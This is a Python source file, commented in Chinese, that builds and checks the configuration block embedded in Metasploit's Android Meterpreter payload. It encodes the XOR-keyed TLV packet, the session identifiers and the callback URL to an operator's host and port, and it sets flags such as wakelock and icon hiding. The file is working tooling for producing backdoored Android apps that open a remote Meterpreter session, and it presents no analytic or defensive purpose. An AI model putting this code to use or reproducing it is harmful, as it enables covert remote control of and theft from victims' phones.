#!/usr/bin/python3
# -*- coding: utf-8 -*-
'''
msf/android meterpreter 的 payload 配置块（TLV 格式）生成器。

## 为什么需要它
老版本（msf 6.0 之前）的 android stager 配置是「定长结构」：
    48 字节 session_data + 512 字节 url + 3 个 uint32 + 扩展 + 0xFFFFFFFF
从 msf 6.x（metasploit-payloads 2021 之后）开始，meterpreter stage 改成用 TLV 解析：

    com.metasploit.stage.ConfigParser.parseConfig(byte[] configBytes)
        configPacket = TLVPacket.fromEncoded(configBytes, null)

`TLVPacket.fromEncoded` 期望的是**完整 meterpreter packet**，不是裸 TLV：

    offset 0  : 4 字节 xor key（随机，1..254，每字节都不能是 0）
    offset 4  : 16 字节 session guid
    offset 20 : 4 字节 加密标志（0 = 不加密）
    offset 24 : 4 字节 packet 长度（= TLV 组长度）
    offset 28 : 4 字节 packet 类型（PACKET_TYPE_CONFIG = 2）
    offset 32 : TLV 组内容（TLV 条目的长度/类型带上 meta 类型位）
    整个 raw（offset 4 起）与 xor key 逐字节异或。

生成逻辑对齐 metasploit-framework 的
    lib/rex/payloads/meterpreter/config.rb#config_block
    lib/rex/post/meterpreter/packet.rb#to_r
老工具写定长结构时，stage 会读到垃圾长度并抛
    java.lang.NegativeArraySizeException
导致 AndroidMeterpreter 构造失败，msfconsole 表现为
    [-] Meterpreter session N is not valid and will be closed / Reason: Died
'''

import os
import struct

# TLV meta 类型位（com.metasploit.TLVPacket）
META_NONE = 0
META_STRING = 1 << 16
META_UINT = 1 << 17
META_RAW = 1 << 18
META_BOOL = 1 << 19
META_GROUP = 1 << 30

# TLV 类型（com.metasploit.TLVType）
TLV_TYPE_DATA = META_RAW | 26
TLV_TYPE_UUID = META_RAW | 461
TLV_TYPE_SESSION_GUID = META_RAW | 462
TLV_TYPE_SESSION_EXPIRY = META_UINT | 700
TLV_TYPE_EXITFUNC = META_UINT | 701
TLV_TYPE_DEBUG_LOG = META_STRING | 702
TLV_TYPE_EXTENSION = META_GROUP | 703
TLV_TYPE_C2 = META_GROUP | 704
TLV_TYPE_C2_COMM_TIMEOUT = META_UINT | 705
TLV_TYPE_C2_RETRY_TOTAL = META_UINT | 706
TLV_TYPE_C2_RETRY_WAIT = META_UINT | 707
TLV_TYPE_C2_URL = META_STRING | 708
TLV_TYPE_C2_PROXY_URL = META_STRING | 710
TLV_TYPE_C2_PROXY_USER = META_STRING | 711
TLV_TYPE_C2_PROXY_PASS = META_STRING | 712
TLV_TYPE_C2_HEADERS = META_STRING | 715
TLV_TYPE_C2_UA = META_STRING | 716
TLV_TYPE_C2_CERT_HASH = META_RAW | 717
TLV_TYPE_STRING = META_STRING | 10
TLV_TYPE_UINT = META_UINT | 11
TLV_TYPE_SESSION_FLAGS = META_UINT | 727

# Packet 类型（lib/rex/post/meterpreter/packet.rb）
PACKET_TYPE_CONFIG = 2

# 安卓 payload 的会话标志位（lib/msf/core/payload/android.rb）
FLAG_STAGELESS = 1
FLAG_DEBUG = 2
FLAG_WAKELOCK = 4
FLAG_HIDE_ICON = 8

# dex 里配置占位区的长度：0xdeadbead 标记 + 8191 个 0
URL_OFFSET = 0x1000
CONFIG_BLOCK_SIZE = 8195

# 默认 UA（http/https 时需要，tcp 用不到）
DEFAULT_HTTP_UA = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36'


class MsfConfigError(ValueError):
    '''配置生成/校验失败'''


def tlv_int(type_id, value):
    '''TLV_TYPE_UINT：长度 = 8 + 4'''
    return struct.pack('>IIi', 12, type_id, int(value))


def tlv_str(type_id, value):
    '''TLV_TYPE_STRING：以 \0 结尾，长度包含 8 字节头'''
    raw = (value or '').encode('utf-8') + b'\0'
    return struct.pack('>II', 8 + len(raw), type_id) + raw


def tlv_raw(type_id, value):
    '''TLV_TYPE_RAW：裸字节'''
    raw = bytes(value or b'')
    return struct.pack('>II', 8 + len(raw), type_id) + raw


def tlv_group(type_id, children):
    '''TLV_TYPE_GROUP：载荷是若干 TLV 的拼接'''
    raw = b''.join(children)
    return struct.pack('>II', 8 + len(raw), type_id) + raw


def xor_bytes(key, data):
    return bytes(b ^ key[i % 4] for i, b in enumerate(data))


def _random_key():
    '''4 字节 xor key，每字节 1..254（与 Ruby 侧 rand(254)+1 一致，避免出现 0）'''
    return bytes((os.urandom(1)[0] % 254) + 1 for _ in range(4))


def _random_guid():
    '''16 字节随机 guid'''
    return os.urandom(16)


def build_c2_group(url, ua=None, comm_timeout=300, retry_total=3600, retry_wait=10,
                   proxy_url=None, proxy_user=None, proxy_pass=None, headers=None,
                   cert_hash=None):
    '''构造一个 TLV_TYPE_C2 分组（对应 config.rb#add_c2_tlv）'''
    children = [
        tlv_int(TLV_TYPE_C2_COMM_TIMEOUT, comm_timeout),
        tlv_int(TLV_TYPE_C2_RETRY_TOTAL, retry_total),
        tlv_int(TLV_TYPE_C2_RETRY_WAIT, retry_wait),
        tlv_str(TLV_TYPE_C2_URL, url),
    ]
    if url.startswith('http'):
        if proxy_url:
            children.append(tlv_str(TLV_TYPE_C2_PROXY_URL, proxy_url))
        if proxy_user:
            children.append(tlv_str(TLV_TYPE_C2_PROXY_USER, proxy_user))
        if proxy_pass:
            children.append(tlv_str(TLV_TYPE_C2_PROXY_PASS, proxy_pass))
        if ua:
            children.append(tlv_str(TLV_TYPE_C2_UA, ua))
        if headers:
            children.append(tlv_str(TLV_TYPE_C2_HEADERS, headers))
        if cert_hash:
            children.append(tlv_raw(TLV_TYPE_C2_CERT_HASH, cert_hash))
    return tlv_group(TLV_TYPE_C2, children)


def build_config_packet(lhost, lport, scheme='tcp', uri=None, flags=FLAG_WAKELOCK,
                        session_expiry=0, comm_timeout=300, retry_total=3600,
                        retry_wait=10, uuid=None, session_guid=None, ua=None,
                        debug_log=None, proxy=None, headers=None, cert_hash=None,
                        extensions=None):
    '''
    生成完整的 PACKET_TYPE_CONFIG 字节串（未填充）。

    :param lhost: 回连地址
    :param lport: 回连端口
    :param scheme: tcp / http / https
    :param uri: http(s) 时的路径
    :param flags: 会话标志位（FLAG_WAKELOCK 等）
    :param session_expiry: 会话过期秒数（0 = 不过期）
    :param debug_log: meterpreter 调试日志路径，可空
    :param extensions: [(type_uint, data_bytes)] 形式的扩展列表，一般留空
    :return: bytes
    '''
    if not lhost:
        raise MsfConfigError('lhost 不能为空')
    try:
        port = int(lport)
    except (TypeError, ValueError):
        raise MsfConfigError('lport 必须是数字: %r' % (lport,))
    if not (0 < port < 65536):
        raise MsfConfigError('lport 超出范围: %r' % (lport,))

    scheme = (scheme or 'tcp').lower()
    if scheme not in ('tcp', 'http', 'https'):
        raise MsfConfigError('不支持的 scheme: %r' % (scheme,))

    url = '%s://%s:%d' % (scheme, lhost, port)
    if scheme != 'tcp' and uri:
        url += '/' + str(uri).lstrip('/')

    # ---- session 部分（config.rb#add_session_tlv）----
    children = [
        tlv_raw(TLV_TYPE_UUID, uuid or _random_guid()),
        tlv_raw(TLV_TYPE_SESSION_GUID, session_guid or _random_guid()),
        tlv_int(TLV_TYPE_SESSION_EXPIRY, session_expiry),
    ]
    if debug_log:
        children.append(tlv_str(TLV_TYPE_DEBUG_LOG, debug_log))
    if flags:
        children.append(tlv_int(TLV_TYPE_SESSION_FLAGS, flags))

    # ---- transport 部分（config.rb#add_c2_tlv）----
    proxy_url = proxy_user = proxy_pass = None
    if proxy:
        proxy_url, proxy_user, proxy_pass = proxy
    children.append(build_c2_group(
        url,
        ua=(ua if scheme != 'tcp' else None) or (DEFAULT_HTTP_UA if scheme != 'tcp' else None),
        comm_timeout=comm_timeout,
        retry_total=retry_total,
        retry_wait=retry_wait,
        proxy_url=proxy_url,
        proxy_user=proxy_user,
        proxy_pass=proxy_pass,
        headers=headers,
        cert_hash=cert_hash,
    ))

    # ---- 扩展部分（config.rb#add_extension_tlv）：安卓默认不含，留空 ----
    for ext_id, ext_data in (extensions or []):
        group = [tlv_raw(TLV_TYPE_DATA, ext_data)]
        if ext_id is not None:
            group.append(tlv_int(TLV_TYPE_UINT, ext_id))
        children.append(tlv_group(TLV_TYPE_EXTENSION, group))

    body = b''.join(children)
    group = struct.pack('>II', 8 + len(body), PACKET_TYPE_CONFIG) + body

    # ---- 打包成 meterpreter packet（packet.rb#to_r）----
    key = _random_key()
    raw = b'\x00' * 16 + struct.pack('>I', 0) + group
    return key + xor_bytes(key, raw)


def build_config_block(lhost, lport, size=CONFIG_BLOCK_SIZE, **kwargs):
    # 生成恰好 size 字节的配置块。
    # 前段 = meterpreter TLV packet（给 stage 的 ConfigParser 用）；
    # 尾部 0x1000 偏移 = ASCII tcp://host:port\0（给内置 stager 读连接地址）。
    packet = build_config_packet(lhost, lport, **kwargs)
    if len(packet) > size:
        raise MsfConfigError('配置超出 %d 字节占位：%d' % (len(packet), size))
    block = bytearray(packet + bytes(size - len(packet)))
    scheme = str(kwargs.get('scheme', 'tcp')).lower()
    uri = kwargs.get('uri') or ''
    if scheme in ('http', 'https'):
        url = '%s://%s:%s%s' % (scheme, lhost, lport, uri)
    else:
        url = 'tcp://%s:%s' % (lhost, lport)
    raw = url.encode('utf-8')
    if URL_OFFSET + len(raw) + 1 > size:
        raise MsfConfigError('URL 过长')
    block[URL_OFFSET:URL_OFFSET + len(raw)] = raw
    block[URL_OFFSET + len(raw)] = 0
    return bytes(block)

# ---------------------------------------------------------------------------
# 校验：逐字节复刻 TLVPacket.fromEncoded + ConfigParser.parseConfig
# ---------------------------------------------------------------------------

def parse_packet(data):
    '''按 TLVPacket.fromEncoded 的逻辑解析，返回 (packet_type, {type: [values]})'''
    if len(data) < 32:
        raise MsfConfigError('数据不足 32 字节，不是 meterpreter packet')
    header = bytearray(data[:32])
    key = bytes(header[:4])
    unxored = bytearray(xor_bytes(key, header))
    body_len = struct.unpack('>i', bytes(unxored[24:28]))[0] - 8
    if body_len < 0:
        raise MsfConfigError('packet 长度为负 (%d)，配置文件格式不对' % body_len)
    if 32 + body_len > len(data):
        raise MsfConfigError('packet 长度 %d 超出数据范围 %d' % (body_len, len(data) - 32))
    enc_flag = struct.unpack('>i', bytes(unxored[20:24]))[0]
    if enc_flag != 0:
        raise MsfConfigError('配置块不应加密（enc_flag=%d）' % enc_flag)
    packet_type = struct.unpack('>i', bytes(unxored[28:32]))[0]
    body = xor_bytes(key, data[32:32 + body_len])
    return packet_type, parse_tlv_stream(body)


def parse_tlv_stream(body):
    '''按 TLVPacket(DataInputStream, int) 的逻辑解析 TLV 流'''
    out = {}
    offset = 0
    while offset < len(body):
        if offset + 8 > len(body):
            break
        length, type_id = struct.unpack('>ii', body[offset:offset + 8])
        if length <= 0 or offset + length > len(body):
            raise MsfConfigError('TLV 长度非法：offset=%d len=%d' % (offset, length))
        value = body[offset + 8:offset + length]
        if type_id & META_STRING:
            if not value.endswith(b'\0'):
                raise MsfConfigError('字符串 TLV 缺少结尾 \\0')
            out.setdefault(type_id, []).append(value[:-1].decode('utf-8', 'replace'))
        elif type_id & META_UINT:
            out.setdefault(type_id, []).append(struct.unpack('>i', value)[0])
        elif type_id & META_GROUP:
            out.setdefault(type_id, []).append(parse_tlv_stream(value))
        else:
            out.setdefault(type_id, []).append(bytes(value))
        offset += length
    return out


def verify_config_block(data, expect_host=None, expect_port=None):
    '''
    校验一段配置块（或已去掉尾部 0 的 packet）是否会被 AndroidMeterpreter 接受。
    返回 dict：{packet_type, session_expiry, uuid_len, session_guid_len, flags, c2:[...]}
    失败抛 MsfConfigError。
    '''
    packet_type, tlvs = parse_packet(data)
    if packet_type != PACKET_TYPE_CONFIG:
        raise MsfConfigError('packet 类型应为 %d，实际 %d' % (PACKET_TYPE_CONFIG, packet_type))
    if TLV_TYPE_SESSION_EXPIRY not in tlvs:
        raise MsfConfigError('缺少 TLV_TYPE_SESSION_EXPIRY')
    if TLV_TYPE_UUID not in tlvs:
        raise MsfConfigError('缺少 TLV_TYPE_UUID')
    if TLV_TYPE_SESSION_GUID not in tlvs:
        raise MsfConfigError('缺少 TLV_TYPE_SESSION_GUID')
    c2_groups = tlvs.get(TLV_TYPE_C2) or []
    if not c2_groups:
        raise MsfConfigError('缺少 TLV_TYPE_C2 传输组')
    result = {
        'packet_type': packet_type,
        'session_expiry': tlvs[TLV_TYPE_SESSION_EXPIRY][0],
        'uuid_len': len(tlvs[TLV_TYPE_UUID][0]),
        'session_guid_len': len(tlvs[TLV_TYPE_SESSION_GUID][0]),
        'flags': (tlvs.get(TLV_TYPE_SESSION_FLAGS) or [0])[0],
        'c2': [],
    }
    for group in c2_groups:
        if TLV_TYPE_C2_URL not in group:
            raise MsfConfigError('C2 组缺少 TLV_TYPE_C2_URL')
        for need, name in ((TLV_TYPE_C2_COMM_TIMEOUT, 'C2_COMM_TIMEOUT'),
                           (TLV_TYPE_C2_RETRY_TOTAL, 'C2_RETRY_TOTAL'),
                           (TLV_TYPE_C2_RETRY_WAIT, 'C2_RETRY_WAIT')):
            if need not in group:
                raise MsfConfigError('C2 组缺少 %s（该 transport 会被跳过）' % name)
        url = group[TLV_TYPE_C2_URL][0]
        result['c2'].append({
            'url': url,
            'comm_timeout': group[TLV_TYPE_C2_COMM_TIMEOUT][0],
            'retry_total': group[TLV_TYPE_C2_RETRY_TOTAL][0],
            'retry_wait': group[TLV_TYPE_C2_RETRY_WAIT][0],
            'ua': (group.get(TLV_TYPE_C2_UA) or [None])[0],
        })
        if expect_host is not None and expect_port is not None:
            want = '%s:%d' % (expect_host, int(expect_port))
            if want not in url:
                raise MsfConfigError('C2 URL 里没有 %s（实际 %s）' % (want, url))
    return result
